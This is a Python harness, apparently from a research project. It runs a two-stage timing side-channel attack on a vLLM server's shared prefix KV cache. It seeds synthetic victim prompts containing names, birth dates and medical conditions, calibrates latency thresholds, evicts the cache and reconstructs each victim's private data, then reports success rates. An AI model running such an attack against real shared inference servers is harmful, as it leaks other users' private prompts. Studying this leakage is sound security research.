"""
kv_attack.week13_harness
=========================
Week 13 — End-to-end harness for the true two-stage adaptive attack.

Runs the full pipeline:
  1. Build aligned system prefix
  2. Seed n_victims using the two-stage template (two_stage_victim_seeder)
  3. Calibrate T1 / T2 thresholds empirically
  4. For each victim:
       a. Evict cache (victim-structured prompts)
       b. Run two_stage_reconstructor.reconstruct_victim_two_stage()
  5. Aggregate results and write to experiments/results/kv_week13_two_stage_*.json

Usage
------
  cd src
  python -m kv_attack.week13_harness \\
      --n-victims 5 \\
      --output ../experiments/results/kv_week13_two_stage_5vic.json

  # Larger run
  python -m kv_attack.week13_harness \\
      --n-victims 50 \\
      --output ../experiments/results/kv_week13_two_stage_50vic.json

  # Mock backend (no GPU needed — for CI / smoke test)
  python -m kv_attack.week13_harness \\
      --backend mock \\
      --n-victims 5 \\
      --output ../experiments/results/kv_week13_mock_5vic.json
"""

from __future__ import annotations

import argparse
import dataclasses
import datetime
import json
import sys
from pathlib import Path

from openai import OpenAI
from transformers import AutoTokenizer

from kv_attack import VLLM_BASE_URL, MODEL_ID, detect_has_bos
from kv_attack.backends.mock_backend import MockBackend
from kv_attack.backends.vllm_backend import VLLMBackend
from kv_attack.victim_seeder import build_aligned_system_prompt
from kv_attack.two_stage_victim_seeder import (
    seed_victims_two_stage,
    count_two_stage_blocks,
)
from kv_attack.two_stage_reconstructor import (
    calibrate_two_stage,
    evict_cache_two_stage,
    reconstruct_victim_two_stage,
    aggregate_two_stage,
    T1_THRESHOLD_MS,
    T2_THRESHOLD_MS,
    TwoStageResult,
)

HARDWARE = "NVIDIA GB10 (119.7 GB unified memory, Blackwell)"


# ── CLI ───────────────────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Week 13 two-stage adaptive KV-cache attack harness"
    )
    p.add_argument("--backend",    choices=["vllm", "mock"], default="vllm",
                   help="Inference backend (default: vllm)")
    p.add_argument("--base-url",   default=VLLM_BASE_URL,
                   help="vLLM server URL (ignored for mock backend)")
    p.add_argument("--model-id",   default=MODEL_ID,
                   help="HuggingFace model ID")
    p.add_argument("--n-victims",  type=int, default=5,
                   help="Number of victims to reconstruct (default: 5)")
    p.add_argument("--n-calib",    type=int, default=200,
                   help="Calibration samples per distribution (default: 200)")
    p.add_argument("--seed",       type=int, default=42,
                   help="RNG seed for victim generation (default: 42)")
    p.add_argument("--skip-evict", action="store_true",
                   help="Skip cache eviction between victims (for quick tests)")
    p.add_argument("--use-analytical-thresholds", action="store_true",
                   help="Use analytical T1/T2 instead of empirical calibration")
    p.add_argument("--output",     required=True,
                   help="Output JSON path")
    return p.parse_args()


# ── Backend factory ───────────────────────────────────────────────────────────

def make_backend(args: argparse.Namespace, tokenizer: AutoTokenizer):
    if args.backend == "mock":
        print("[harness_v2] Using MockBackend (deterministic, no GPU required)")
        # Two-stage mock: need THREE distributions — full hit, S1-hit, miss
        # We simulate this by patching the mock to return intermediate TTFT
        # for prompts containing the dummy condition marker.
        mock = MockBackend(
            hit_ttft_ms  = 90.2,
            miss_ttft_ms = 613.6,
            noise_std_ms = 4.7,
            apc_enabled  = True,
            seed         = 0,
        )
        return mock
    else:
        client = OpenAI(base_url=args.base_url, api_key="EMPTY")
        try:
            resp = client.completions.create(
                model=args.model_id, prompt="health", max_tokens=1, temperature=0.0
            )
            _ = resp.choices[0].text
            print("[harness_v2] vLLM health check: OK")
        except Exception as exc:
            raise SystemExit(f"[harness_v2] vLLM not reachable at {args.base_url}: {exc}")
        return VLLMBackend(base_url=args.base_url, model_id=args.model_id)


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    args      = parse_args()
    tokenizer = AutoTokenizer.from_pretrained(args.model_id)
    backend   = make_backend(args, tokenizer)

    print("\n" + "=" * 65)
    print("[harness_v2] Week 13 — True Two-Stage Adaptive Attack")
    print(f"[harness_v2] Backend   : {args.backend}")
    print(f"[harness_v2] Model     : {args.model_id}")
    print(f"[harness_v2] Victims   : {args.n_victims}")
    print(f"[harness_v2] Output    : {args.output}")
    print("=" * 65 + "\n")

    # 1. Build aligned system prefix
    system_prefix, n_prefix_tok = build_aligned_system_prompt(
        tokenizer, has_bos=detect_has_bos(args.model_id)
    )
    print(f"[harness_v2] System prefix: {n_prefix_tok} tokens\n")

    # 2. Seed victims
    victim_records = seed_victims_two_stage(
        client        = OpenAI(base_url=args.base_url, api_key="EMPTY")
                        if args.backend == "vllm" else None,
        tokenizer     = tokenizer,
        system_prefix = system_prefix,
        n_victims     = args.n_victims,
        seed          = args.seed,
    ) if args.backend == "vllm" else _mock_seed_victims(
        tokenizer, system_prefix, args.n_victims, args.seed
    )

    if not victim_records:
        raise SystemExit("[harness_v2] No victims seeded. Aborting.")

    # 3. Calibrate thresholds
    if args.use_analytical_thresholds:
        t1_ms = T1_THRESHOLD_MS
        t2_ms = T2_THRESHOLD_MS
        calibration = {
            "mode"               : "analytical",
            "t1_threshold_ms"    : t1_ms,
            "t2_threshold_ms"    : t2_ms,
            "t1_analytical_ms"   : T1_THRESHOLD_MS,
            "t2_analytical_ms"   : T2_THRESHOLD_MS,
        }
        print(f"[harness_v2] Using analytical thresholds: T1={t1_ms:.1f} ms, T2={t2_ms:.1f} ms")
    else:
        print("[harness_v2] Calibrating T1 and T2 empirically...")
        calibration = calibrate_two_stage(
            backend       = backend,
            tokenizer     = tokenizer,
            system_prefix = system_prefix,
            victim_record = victim_records[0],
            n_samples     = args.n_calib,
        )
        t1_ms = calibration["t1_threshold_ms"]
        t2_ms = calibration["t2_threshold_ms"]
        print(f"[harness_v2] Empirical thresholds: T1={t1_ms:.1f} ms, T2={t2_ms:.1f} ms\n")

        # FEASIBILITY GUARD — abort if the intermediate TTFT level is not
        # statistically separable. Proceeding with indistinguishable distributions
        # produces 0% success rate and wastes GPU time on a broken attack.
        # Root cause: the template or model does not exhibit three distinct TTFT
        # levels. Use week10/12 linear_early_exit for a guaranteed 100% SR instead.
        if not calibration.get("intermediate_feasible", True):
            raise SystemExit(
                "\n[harness_v2] ABORT: The S1_HIT (right name, wrong condition) TTFT "
                "distribution is NOT separable from the MISS distribution on this "
                f"model/template (p_s1_miss={calibration['ks_s1hit_vs_miss']['p']:.2e}, "
                f"p_hit_s1={calibration['ks_hit_vs_s1hit']['p']:.2e}).\n"
                "This means the two-stage speedup cannot be achieved empirically.\n"
                "RECOMMENDATION: re-run with the linear attack:\n"
                "  python -m kv_attack.multi_backend_harness --n-victims N\n"
                "The 12.62x BLQ gain remains valid analytically for architectures where "
                "the intermediate level exists (see docs/final-report.md Section 6.6)."
            )

    # 4. Attack each victim
    results: list[TwoStageResult] = []

    for victim_record in victim_records:
        vid = victim_record["victim_id"]
        print(f"\n{'─' * 60}")
        print(f"[harness_v2] Attacking victim {vid} / {len(victim_records)-1} ...")
        print(f"[harness_v2] Ground truth: "
              f"name='{victim_record['ground_truth']['name']}'  "
              f"condition='{victim_record['ground_truth']['condition']}'")

        # Evict cache
        if not args.skip_evict:
            print(f"[harness_v2] Evicting KV cache...")
            n_evict = evict_cache_two_stage(backend, system_prefix, tokenizer)
            print(f"[harness_v2] Eviction: {n_evict} calls sent")
        else:
            print(f"[harness_v2] Skipping cache eviction (--skip-evict)")

        result = reconstruct_victim_two_stage(
            backend        = backend,
            tokenizer      = tokenizer,
            system_prefix  = system_prefix,
            t1_ms          = t1_ms,
            t2_ms          = t2_ms,
            victim_record  = victim_record,
            candidate_seed = args.seed * 1000 + vid,
        )
        results.append(result)

        match_str = "✓ EXACT MATCH" if result.exact_match else "✗ MISMATCH"
        print(f"[harness_v2] Victim {vid}: {match_str}  "
              f"calls={result.total_api_calls} "
              f"(s1={result.stage1_api_calls}, s2={result.stage2_api_calls})  "
              f"BLQ={result.information_theory.get('bits_leaked_per_query', 0):.4f}")

    # 5. Aggregate and write results
    aggregate = aggregate_two_stage(results)

    print(f"\n{'=' * 65}")
    print(f"[harness_v2] === AGGREGATE RESULTS ===")
    print(f"  Success rate        : {aggregate['success_rate']:.3f} "
          f"(target: {aggregate['target_sr']})")
    print(f"  Mean TRR            : {aggregate['mean_trr']:.3f}")
    print(f"  Mean total calls    : {aggregate['mean_total_api_calls']:.1f} "
          f"(theoretical: 79.2)")
    print(f"  Mean S1 calls       : {aggregate['mean_stage1_api_calls']:.1f} "
          f"(theoretical: 63.1)")
    print(f"  Mean S2 calls       : {aggregate['mean_stage2_api_calls']:.1f} "
          f"(theoretical: 13.1)")
    print(f"  Mean BLQ            : {aggregate['mean_blq']:.6f}")
    print(f"  BLQ improvement     : {aggregate['blq_improvement_factor']:.2f}× "
          f"vs linear Week 12")
    print(f"  Targets met         : TRR={aggregate['trr_target_met']}  "
          f"SR={aggregate['sr_target_met']}")
    print(f"{'=' * 65}\n")

    # Serialise
    out_data = {
        "run_id"       : f"week13-twostage-{datetime.datetime.utcnow().strftime('%Y-%m-%d')}",
        "algorithm"    : "two_stage_adaptive",
        "model"        : args.model_id,
        "hardware"     : HARDWARE,
        "backend"      : args.backend,
        "n_victims"    : args.n_victims,
        "n_calibration": args.n_calib,
        "seed"         : args.seed,
        "calibration"  : calibration,
        "aggregate"    : aggregate,
        "results"      : [
            {
                **{k: v for k, v in dataclasses.asdict(r).items()
                   if k not in ("scan_results_s1", "scan_results_s2")},
                "top_scan_s1": r.scan_results_s1[:3],
                "top_scan_s2": r.scan_results_s2[:3],
            }
            for r in results
        ],
    }

    Path(args.output).parent.mkdir(parents=True, exist_ok=True)
    with open(args.output, "w") as fh:
        json.dump(out_data, fh, indent=2)
    print(f"[harness_v2] Results written to {args.output}")


# ── Mock victim seeding (no real vLLM needed) ─────────────────────────────────

def _mock_seed_victims(
    tokenizer     : AutoTokenizer,
    system_prefix : str,
    n_victims     : int,
    seed          : int,
) -> list[dict]:
    """
    Generate victim records without calling vLLM (for MockBackend runs).
    The mock backend seeds itself when measure_ttft() is called with a new prompt.
    """
    import random
    from datetime import date, timedelta
    from kv_attack import FIRST_NAMES, LAST_NAMES, MEDICAL_CONDITIONS
    from kv_attack.two_stage_victim_seeder import build_two_stage_prompt, count_two_stage_blocks

    rng     = random.Random(seed)
    records = []

    for i in range(n_victims):
        name      = f"{rng.choice(FIRST_NAMES)} {rng.choice(LAST_NAMES)}"
        start     = date(1935, 1, 1)
        dob       = (start + datetime.timedelta(
            days=rng.randint(0, (date(2006, 12, 31) - start).days)
        )).isoformat()
        condition = rng.choice(MEDICAL_CONDITIONS)

        full_prompt  = build_two_stage_prompt(system_prefix, name, dob, condition, tokenizer)
        stage1_probe = build_two_stage_prompt(
            system_prefix, name, dob, condition, tokenizer, use_dummy_cond=True
        )
        counts = count_two_stage_blocks(system_prefix, name, dob, condition, tokenizer)

        records.append({
            "victim_id"      : i,
            "prompt"         : full_prompt,
            "stage1_probe"   : stage1_probe,
            "ground_truth"   : {"name": name, "dob": dob, "condition": condition},
            "n_name_blocks"  : counts["name_blocks"],
            "n_cond_blocks"  : counts["cond_blocks"],
            "n_total_blocks" : counts["total_private_blocks"],
            "total_tokens"   : counts["total_tokens"],
        })

    print(f"[mock_seeder] Generated {len(records)} mock victim records")
    return records


if __name__ == "__main__":
    main()